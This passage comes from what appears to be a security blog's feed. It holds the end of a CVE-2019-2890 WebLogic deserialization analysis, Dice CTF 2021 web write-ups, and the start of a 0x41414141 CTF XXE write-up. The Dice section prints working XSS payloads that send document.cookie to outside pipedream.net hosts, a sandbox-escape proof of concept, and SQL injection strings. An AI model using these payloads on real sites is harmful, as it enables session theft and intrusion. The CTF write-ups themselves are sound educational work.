생성하고, 해당 파일로 익스를 진행하면 RCE를 트리거 할 수 있습니다.</p><hr><h2 id="CVE-2019-2890-Patch"><a href="#CVE-2019-2890-Patch" class="headerlink" title=" CVE-2019-2890 Patch"></a><span style="color:#21C587"></span> CVE-2019-2890 Patch</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readSubject</span><span class="params">(ObjectInputStream in)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = in.readInt();</span><br><span class="line">        <span class="keyword">byte</span>[] var3 = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</span><br><span class="line">        in.readFully(bytes);</span><br><span class="line">        <span class="keyword">if</span> (KernelStatus.isServer()) &#123;</span><br><span class="line">            bytes = EncryptionUtil.decrypt(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream in2 = <span class="keyword">new</span> PersistentContext.WSFilteringObjectInputStream(bais);</span><br><span class="line">        <span class="keyword">this</span>._subject = (AuthenticateSubject)in2.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">        WseeCoreLogger.logUnexpectedException(<span class="string">&quot;Couldn&#x27;t completely read PersistenContext subject&quot;</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>패치 코드를 확인해보면 <code>readSubject</code> 메서드에서 데이터를 검증하는 <code>WSFilteringObjectInputStream</code> 메서드를 이용해서 검증하고 있는 것을 볼 수 있습니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> tatic <span class="class"><span class="keyword">class</span> <span class="title">WSFilteringObjectInputStream</span> <span class="keyword">extends</span> <span class="title">FilteringObjectInputStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String firstClassName;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WSFilteringObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass descriptor) <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">        Class clazz = <span class="keyword">super</span>.resloveClass(descriptor);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.firstClassName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            String className = descriptor.getName();</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clazz.asSubclass(Subject.class);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassExecption(<span class="string">&quot;Internal System Error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">this</span>.firstClassName = className;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>WSFilteringObjectInputStream</code> 메서드는 위와 같습니다.</p><hr><h2 id="CVE-2019-2890-Point"><a href="#CVE-2019-2890-Point" class="headerlink" title=" CVE-2019-2890 Point"></a><span style="color:#21C587"></span> CVE-2019-2890 Point</h2><ul><li>조건<br></li></ul><ol><li>웹 로직에서 T3 프로토콜이 열려있어야한다.</li><li>웹 로직에서 사용하고 있는 SerializedSystemIni.dat 파일을 릭할 수 있어야 한다.</li></ol><p>분석을 해본 결과 해당 취약점을 이용해서 익스를 하기 위해서는 위 2가지 조건을 충족해야 하는 거 같습니다. 긴 글 읽어주셔서 감사합니다.</p><hr>]]></content>
      
      
      <categories>
          
          <category> Analysis </category>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dice CTF 2021 Write Up</title>
      <link href="2021/02/08/2021-02-08-Dice-2021-CTF/"/>
      <url>2021/02/08/2021-02-08-Dice-2021-CTF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image/blob/main/Dice%20CTF/dice%20main.png?raw=true"></p><hr><h2 id="Web-Babier-CSP-107-pts"><a href="#Web-Babier-CSP-107-pts" class="headerlink" title=" (Web) Babier CSP [107 pts]"></a><span style="color:#21C587"></span> (Web) Babier CSP [107 pts]</h2><blockquote><p>The Babier CSP challenge is a simple CSP Bypass challenge.</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">LRGWAXOY98Es0zz0QOVmag</span>==&gt;</span></span><br><span class="line"><span class="javascript">elem.onclick = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">  location = <span class="string">&quot;/?name=&quot;</span> + <span class="built_in">encodeURIComponent</span>([<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;orange&quot;</span>, <span class="string">&quot;pineapple&quot;</span>, <span class="string">&quot;pear&quot;</span>][<span class="built_in">Math</span>.floor(<span class="number">4</span> * <span class="built_in">Math</span>.random())]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>If you check the source code, you can see that the nonce value of the script tag is set as above. I thought that the admin bot was also applying the nonce value as above.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce&#x3D;LRGWAXOY98Es0zz0QOVmag&#x3D;&#x3D;&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script nonce&#x3D;LRGWAXOY98Es0zz0QOVmag&#x3D;&#x3D;&gt;location.href&#x3D;&quot;https:&#x2F;&#x2F;79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&quot;%2bdocument.cookie&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br></p><blockquote><p>FLAG : dice{web_1s_a_stat3_0f_grac3_857720}</p></blockquote><hr><h2 id="Web-Missing-Flavortext-111-pts"><a href="#Web-Missing-Flavortext-111-pts" class="headerlink" title=" (Web) Missing Flavortext [111 pts]"></a><span style="color:#21C587"></span> (Web) Missing Flavortext [111 pts]</h2><blockquote><p> The Missing Flavortext challenge is a SQL Injection challenge that bypasses single quotas by using the features of express.js.</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ([req.body.username, req.body.password].some(<span class="function"><span class="params">v</span> =&gt;</span> v.includes(<span class="string">&#x27;\&#x27;&#x27;</span>))) &#123;</span><br><span class="line">  <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the code above, single quota is filtered using the includes function. However, this can be bypassed by passing it as an array because it only verifies strings.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&amp;password[]&#x3D;1&amp;password[]&#x3D;&#39; or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br></p><blockquote><p>FLAG : dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}</p></blockquote><hr><h2 id="Web-Web-Utils-121-pts"><a href="#Web-Web-Utils-121-pts" class="headerlink" title=" (Web) Web Utils [121 pts]"></a><span style="color:#21C587"></span> (Web) Web Utils [121 pts]</h2><blockquote><p>TThe Web Utils challenge is a challenge that triggers XSS using a vulnerability when receiving the req.body value.</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// view.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span>&gt;</span></span><br><span class="line"><span class="javascript">    (<span class="keyword">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> id = <span class="built_in">window</span>.location.pathname.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">2</span>];</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (! id) <span class="built_in">window</span>.location = <span class="built_in">window</span>.origin;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> res = <span class="keyword">await</span> fetch(<span class="string">`<span class="subst">$&#123;<span class="built_in">window</span>.origin&#125;</span>/api/data/<span class="subst">$&#123;id&#125;</span>`</span>);</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> &#123; data, type &#125; = <span class="keyword">await</span> res.json();</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (! data || ! type ) <span class="built_in">window</span>.location = <span class="built_in">window</span>.origin;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (type === <span class="string">&#x27;link&#x27;</span>) <span class="keyword">return</span> <span class="built_in">window</span>.location = data;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (<span class="built_in">document</span>.readyState !== <span class="string">&quot;complete&quot;</span>)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> &#123; <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;load&#x27;</span>, r); &#125;);</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.title = <span class="string">&#x27;Paste&#x27;</span>;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.querySelector(<span class="string">&#x27;div&#x27;</span>).textContent = data;</span></span><br><span class="line">    &#125;)()</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><p>It is view.html code, and if the type is link in the middle, you can see window.location as data. And if data contains a payload such as <code>javascript:alert(1)</code>, you can trigger xss.<br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// api.js</span></span><br><span class="line">(skip)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="keyword">async</span> (fastify) =&gt; &#123;</span><br><span class="line">  fastify.post(<span class="string">&#x27;createLink&#x27;</span>, &#123;</span><br><span class="line">    handler: <span class="function">(<span class="params">req, rep</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> uid = database.generateUid(<span class="number">8</span>);</span><br><span class="line">      <span class="keyword">const</span> regex = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;^https?://&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (! regex.test(req.body.data))</span><br><span class="line">        <span class="keyword">return</span> rep</span><br><span class="line">        </span><br><span class="line">(skip)</span><br></pre></td></tr></table></figure><p>However, if you look at the link creation logic, the value of <code>req.body.data</code> is verified with a regular expression. So, you can’t put xss payload in the link creation logic.<br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// api.js</span></span><br><span class="line">(skip)</span><br><span class="line"></span><br><span class="line">fastify.post(<span class="string">&#x27;createPaste&#x27;</span>, &#123;</span><br><span class="line">    handler: <span class="function">(<span class="params">req, rep</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> uid = database.generateUid(<span class="number">8</span>);</span><br><span class="line">      database.addData(&#123; <span class="attr">type</span>: <span class="string">&#x27;paste&#x27;</span>, ...req.body, uid &#125;);</span><br><span class="line">      rep</span><br><span class="line">        .code(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">(skip)</span><br></pre></td></tr></table></figure><p>However, if you look at the logic that creates the Pate, there is no verification for req.body, which causes a vulnerability here. Using this, you can give type as link and data as xss payload.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;data&quot;:&quot;javascript:alert(1)&quot;,&quot;type&quot;:&quot;link&quot;&#125;</span><br><span class="line">&#123;&quot;data&quot;:&quot;javascript:location.href&#x3D;&#39;https:&#x2F;&#x2F;79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&#x2F;&#39;%2bdocument.cookie&quot;,&quot;type&quot;:&quot;link&quot;&#125;</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br>   </p><blockquote><p>FLAG : dice{f1r5t_u53ful_j4v45cr1pt_r3d1r3ct}</p></blockquote><hr><h2 id="Web-Build-a-Panel-130-pts"><a href="#Web-Build-a-Panel-130-pts" class="headerlink" title=" (Web) Build a Panel [130 pts]"></a><span style="color:#21C587"></span> (Web) Build a Panel [130 pts]</h2><blockquote><p> The Build a Panel challenge is the challenge of reading flags using SQL Injection in the insert statement.</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/admin/debug/add_widget&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> cookies = req.cookies;</span><br><span class="line">    <span class="keyword">const</span> queryParams = req.query;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(cookies[<span class="string">&#x27;token&#x27;</span>] &amp;&amp; cookies[<span class="string">&#x27;token&#x27;</span>] == secret_token)&#123;</span><br><span class="line">        query = <span class="string">`INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES (&#x27;<span class="subst">$&#123;queryParams[<span class="string">&#x27;panelid&#x27;</span>]&#125;</span>&#x27;, &#x27;<span class="subst">$&#123;queryParams[<span class="string">&#x27;widgetname&#x27;</span>]&#125;</span>&#x27;, &#x27;<span class="subst">$&#123;queryParams[<span class="string">&#x27;widgetdata&#x27;</span>]&#125;</span>&#x27;);`</span>;</span><br><span class="line">        db.run(query, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(err)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(err);</span><br><span class="line">                res.send(<span class="string">&#x27;something went wrong&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res.send(<span class="string">&#x27;success!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>This is the logic of add_widget running on admin bot. When looking at the query, the input value is entered without any verification, so SQL Injection can be performed.<br></p><p>If we put our panelid in panelid and a query that reads flag in widgetname, a widget is created on our server, and the widget name contains <code>FLAG</code>. (panelid is stored in a cookie.)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;build-a-panel.dicec.tf&#x2F;admin&#x2F;debug&#x2F;add_widget?panelid&#x3D;pocas&amp;widgetname&#x3D;adfdaf&amp;widgetdata&#x3D;a&#39;), (&#39;pocas&#39;, (select flag from flag), &#39;&#123;&quot;type&quot;:&quot;pocas&quot;&#125;&#39;)--</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br> </p><blockquote><p>FLAG : dice{ch41n_ChAIn_aNd_m0Re_cHaIn}</p></blockquote><hr><h2 id="Web-Web-IDE-196-pts"><a href="#Web-Web-IDE-196-pts" class="headerlink" title=" (Web) Web IDE [196 pts]"></a><span style="color:#21C587"></span> (Web) Web IDE [196 pts]</h2><blockquote><p>The Web IDE challenge is a challenge that bypasses iframe sandbox and triggers XSS.</p></blockquote><ul><li>Scenario<br></li></ul><ol><li>We are using <code>allow-scripts</code> as an option for iframe, and the value we input is executed by the eval function in sandbox.html.</li><li>The path to the administrator’s cookie is /ide, so it is not easy to read the cookie. Because xss payload runs in /sandbox.html.</li><li>So, first you need to create a separate site and bypass the iframe sandbox.</li><li>If you bypass the iframe sandbox, you are not limited by sop, and you can freely execute xss payloads.</li><li>However, since xss payload is executed in <code>/sandbox.html</code>, it cannot read the admin cookie.</li><li>So, create an object using <code>window.open(&quot;/ide&quot;)</code>, and execute xss payload on the object to steal the cookie.<br></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>xss poc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">sendMessage</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// window open -&gt; make file -&gt; include it</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> cmd=<span class="string">&quot;[].constructor.constructor(\&quot;(async () =&gt; &#123;const res = await fetch(&#x27;https://web-ide.dicec.tf/ide/save&#x27;, &#123;method:&#x27;POST&#x27;, headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/javascript&#x27;&#125;, body: &#x27;const myWindow = window.open(\\\&quot;/ide\\\&quot;); (async (myWindow) =&gt; &#123; await setTimeout( async() =&gt; &#123;await fetch(`https://en20uuq0p0wxmkp.m.pipedream.net/?flag=$&#123;myWindow.document.cookie&#125;`)&#125;, 500) &#125;)(myWindow)&#x27;&#125;); const file_name = await res.text(); const scr = document.createElement(&#x27;script&#x27;); scr.src = `/ide/saves/$&#123;file_name&#125;`; document.body.appendChild(scr);&#125;)()\&quot;)()&quot;</span></span></span><br><span class="line">            </span><br><span class="line"><span class="javascript">            <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> &#123; <span class="built_in">window</span>.addEventListener((<span class="string">&#x27;load&#x27;</span>), r); &#125;);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.querySelector(<span class="string">&#x27;iframe&#x27;</span>)</span></span><br><span class="line">              .contentWindow</span><br><span class="line"><span class="javascript">              .postMessage(cmd, <span class="string">&#x27;*&#x27;</span>);  <span class="comment">// IDE -&gt; sandbox message</span></span></span><br><span class="line">        &#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&quot;sendMessage()&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&#x27;hh&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;https://web-ide.dicec.tf/sandbox.html&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The payload used is as above.<br> </p><blockquote><p>FLAG : dice{c0uldn7_f1nd_4_b4ckr0nym_f0r_1de}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x41414141 CTF Write Up</title>
      <link href="2021/01/30/2021-01-31-0x414141410CTF/"/>
      <url>2021/01/30/2021-01-31-0x414141410CTF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/team.png?raw=true"></p><p>2021년 1월 26일 저녁에 <code>Ainsetin</code>님이 씨텝 같이 하자고 하셔서 31일까지 참여를 했었는데 많은 도움이 되지 못 한 거 같아 스스로 반성을 많이 한 대회입니다. 여튼 이번 대회에는 버스를 타서 14등을 했고, 솔브수가 그나마 적은 웹 3 문제의 Write Up을 작성해보겠습니다.<br></p><hr><h2 id="Web-Special-Order-pt2-490-pts"><a href="#Web-Special-Order-pt2-490-pts" class="headerlink" title=" (Web) Special Order pt2 [490 pts]"></a><span style="color:#21C587"></span> (Web) Special Order pt2 [490 pts]</h2><blockquote><p>Special Order pt2 문제는 웹 애플리케이션 취약점을 찾고, OOB XXE를 이용해서 flag를 긁어오는 문제입니다.</p></blockquote><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/Special%20Order%20pt2/1.png?raw=true"></p><p>문제로 들어오면 login 폼이 보이고, 바로 밑에 회원 가입 링크가 있는 것을 볼 수 있습니다. 그러니 그냥 가입하고, 로그인을 해주면 됩니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/Special%20Order%20pt2/2.png?raw=true"></p><p>로그인을 하고 들어오면 <code>special Order</code> 블로그가 나오는 것을 볼 수 있고, 위에 보면 <code>HOME</code>, <code>POST</code>, <code>POST SETTING</code>, <code>CREATE POST</code>가 있는 것을 볼 수 있습니다. 취약점은 <code>POST SETTING</code>에서 터집니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/Special%20Order%20pt2/3.png?raw=true"></p><p><code>POST SETTING</code>로 들어오면 폰트 색상과 폰트 사이즈를 정해서 보낼 수 있습니다. 한 번 요청을 보내 헤더를 잡아보겠습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 33</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;color&quot; : &quot;red&quot;, &quot;size&quot;: &quot;20px&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 11:50:42 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 7</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">DONE :D</span><br></pre></td></tr></table></figure><p>요청 헤더를 보면 색상과 사이즈를 json으로 보내는 것을 볼 수 있습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 33</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;color&quot; : &quot;red&quot;, &quot;size&quot;: &quot;20px&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 11:52:00 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 70</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">Start tag expected, &#39;&lt;&#39; not found, line 1, column 1 (&lt;string&gt;, line 1)</span><br></pre></td></tr></table></figure><p>여기서 Content-Type을 <code>application/xml</code>로 바꿔서 보내주면 XML Parsing 에러가 나는 것을 볼 수 있습니다. 이 말은 XML이 작동 중이며 XXE 공격이 가능하다는 소리입니다. 일단 색상과 사이즈의 크기는 응답에 포함되지 않기 때문에 일반적인 XXE 기법을 이용할 순 없습니다. 그래서 <code>Out-of-band XXE</code> 기법을 이용하기로 했고, 해당 기법을 쓸려면 일단 DTD를 로드 할 수 있는 지 확인해야합니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 